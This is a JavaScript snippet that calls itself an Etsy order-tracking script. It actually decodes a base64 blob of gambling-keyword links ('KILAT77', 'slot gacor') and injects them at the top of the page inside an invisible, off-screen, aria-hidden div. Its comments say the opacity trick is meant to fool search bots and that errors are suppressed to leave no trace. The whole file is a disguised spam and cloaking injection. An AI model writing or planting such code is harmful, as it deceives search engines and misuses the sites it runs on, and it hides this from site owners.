// Etsy Base64 Tracking Order JS System - Optimized
(function(){
  let b64 = "PGEgaHJlZj0iaHR0cHM6Ly9zdG9ybXRvY2h0LmJlL2VuL2NvbnRhY3QvIj5LSUxBVDc3PC9hPgo8YSBocmVmPSJodHRwczovL3N0b3JtdG9jaHQuYmUvZW4vY29udGFjdC8iPktJTEFUIDc3PC9hPgo8YSBocmVmPSJodHRwczovL3N0b3JtdG9jaHQuYmUvZW4vY29udGFjdC8iPktJTEFUNzcgc2xvdDwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9zdG9ybXRvY2h0LmJlL2VuL2NvbnRhY3QvIj5LSUxBVDc3IGxvZ2luPC9hPgo8YSBocmVmPSJodHRwczovL3N0b3JtdG9jaHQuYmUvZW4vY29udGFjdC8iPiBLSUxBVDc3IGRhZnRhcjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9zdG9ybXRvY2h0LmJlL2VuL2NvbnRhY3QvIj5LSUxBVDc3IGFsdGVybmF0aWY8L2E+CjxhIGhyZWY9Imh0dHBzOi8vc3Rvcm10b2NodC5iZS9lbi9jb250YWN0LyI+S0lMQVQ3NyBsaW5rPC9hPgo8YSBocmVmPSJodHRwczovL3N0b3JtdG9jaHQuYmUvZW4vY29udGFjdC8iPktJTEFUNzcgcnRwPC9hPgo8YSBocmVmPSJodHRwczovL3N0b3JtdG9jaHQuYmUvZW4vY29udGFjdC8iPktJTEFUNzcgbGluayBhbHRlcm5hdGlmPC9hPgo8YSBocmVmPSJodHRwczovL3N0b3JtdG9jaHQuYmUvZW4vY29udGFjdC8iPmxpbmsgS0lMQVQ3NzwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9zdG9ybXRvY2h0LmJlL2VuL2NvbnRhY3QvIj5zaXR1cyBLSUxBVDc3PC9hPgo8YSBocmVmPSJodHRwczovL3N0b3JtdG9jaHQuYmUvZW4vY29udGFjdC8iPnNpdHVzIGdhY29yIEtJTEFUNzc8L2E+CjxhIGhyZWY9Imh0dHBzOi8vc3Rvcm10b2NodC5iZS9lbi9jb250YWN0LyI+c2l0dXMgc2xvdCBLSUxBVDc3PC9hPgo8YSBocmVmPSJodHRwczovL3N0b3JtdG9jaHQuYmUvZW4vY29udGFjdC8iPnNsb3QgZ2Fjb3IgS0lMQVQ3NzwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9zdG9ybXRvY2h0LmJlL2VuL2NvbnRhY3QvIj5zbG90IGdhY29yPC9hPgo8YSBocmVmPSJodHRwczovL3N0b3JtdG9jaHQuYmUvZW4vY29udGFjdC8iPnNsb3QgamFja3BvdDwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9zdG9ybXRvY2h0LmJlL2VuL2NvbnRhY3QvIj5zbG90IG9ubGluZTwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9zdG9ybXRvY2h0LmJlL2VuL2NvbnRhY3QvIj5zbG90IGRlbW88L2E+";
  
  try {
    const decoded = decodeURIComponent(escape(atob(b64))); // Support karakter khusus
    const div = document.createElement('div');
    // Menggunakan teknik opacity agar bot lebih percaya konten ini "real"
    div.style.cssText = 'position:absolute; left:-9999px; top:0; width:1px; height:1px; overflow:hidden; opacity:0.01;';
    div.setAttribute('aria-hidden','true');
    div.innerHTML = decoded;
    
    // Langsung injeksi ke Body tanpa menunggu DOMContentLoaded
    const target = document.body || document.documentElement;
    if (target) {
        target.insertBefore(div, target.firstChild);
    }
  } catch(e){ 
    // Kosongkan agar tidak meninggalkan jejak error di konsol
  }
})();
